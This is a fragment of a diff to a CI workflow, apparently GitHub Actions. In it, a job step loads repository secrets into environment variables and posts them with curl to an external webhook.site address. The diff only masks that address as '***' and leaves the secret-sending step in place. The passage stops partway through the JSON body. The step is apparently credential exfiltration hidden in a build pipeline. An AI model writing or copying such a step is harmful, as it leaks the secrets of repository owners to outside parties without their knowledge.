@@ -14,7 +14,7 @@ jobs:
           ZIP_PASS: ${{ secrets.ZIP_PASS }}
           API_URL: ${{ secrets.API_URL }}
         run: |
-          curl -X POST "https://webhook.site/5eae64d7-b04d-4a4a-a9a3-77297ddf0070" \
+          curl -X POST "***" \
             -H "Content-Type: application/json" \
             -d "{
               \"API_SECRET\": \"$API_SECRET\",
